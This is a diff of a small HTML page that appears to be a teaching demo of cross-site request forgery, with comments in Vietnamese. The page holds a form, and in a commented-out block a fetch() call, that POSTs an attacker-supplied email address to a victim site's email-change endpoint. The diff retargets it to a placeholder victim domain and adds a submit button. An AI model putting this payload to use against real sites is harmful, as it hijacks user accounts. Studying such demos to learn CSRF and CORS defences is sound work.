@@ -1,10 +1,14 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <form action="http://csrf-main.io/user/email"
+    <form action="http://csrf-victim.tk/user/email"
         method="POST">
         <input name="email"
             value="malicious-email@example.com" />
+
+        <button type="submit">
+            Submit
+        </button>
     </form>
 
     <script>
@@ -12,11 +16,13 @@
 		
 		// Gọi AJAX sẽ bị lỗi CORS
 		// Nhưng nếu server cấu hình CORS sai thì vẫn gọi được
-		fetch('http://csrf-main.io/user/email', {
+        /*
+		fetch('http://csrf-victim.tk/user/email', {
 			method: 'POST',
 			body: JSON.stringify({ email: 'malicious-email@example.com' }),
 			headers: { 'Content-Type': 'application/json; charset=UTF-8' },
 		});
+        */
     </script>
 </body>
 </html>
